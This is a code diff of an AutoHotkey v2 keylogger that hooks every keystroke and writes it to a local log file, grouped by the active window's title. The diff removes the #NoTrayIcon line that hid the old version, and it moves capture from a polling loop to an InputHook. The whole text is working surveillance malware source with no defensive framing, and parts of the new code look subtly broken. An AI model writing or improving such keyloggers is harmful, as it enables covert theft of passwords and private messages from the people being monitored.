@@ -1,35 +1,34 @@
 #Requires AutoHotkey v2.0
 #SingleInstance Force
-#NoTrayIcon
 
-LogFile := A_ScriptDir "\Log.txt"
+LogFile := A_ScriptDir "\log.txt"
 LastWin := ""
 
 ; Create log file if it doesn't exist
 if !FileExist(LogFile)
-    FileAppend "", LogFile
+    FileAppend("", LogFile)
 
-Loop {
-    ; Get active window title
-    try CurrentWin := WinGetTitle("A")
+; Set up input hook
+ih := InputHook("V")
+ih.KeyOpt("{All}", "E") ; capture every key
+ih.OnKeyDown := Func("LogKey")
+ih.Start()
+
+LogKey(ih, vk, sc) {
+    global LogFile, LastWin
+    try
+        CurrentWin := WinGetTitle("A")
     catch
         CurrentWin := "N/A"
-    
-    ; Capture single key press
-    IH := InputHook("L1 V")
-    IH.Start()
-    IH.Wait()
-    Key := IH.Input
-    
-    ; Skip empty keys (like modifier-only presses)
-    if Key = ""
-        continue
-    
-    ; Log based on window change
-    if (CurrentWin == LastWin) {
-        FileAppend Key, LogFile
-    } else {
-        FileAppend "`n" CurrentWin "|" Key "|", LogFile
+
+    ; Only log if window changed
+    if (CurrentWin != LastWin) {
+        FileAppend("`n[" CurrentWin "]`n", LogFile)
         LastWin := CurrentWin
     }
+
+    ; Append key
+    Key := GetKeyName(vk)
+    if (Key != "")
+        FileAppend(Key, LogFile)
 }
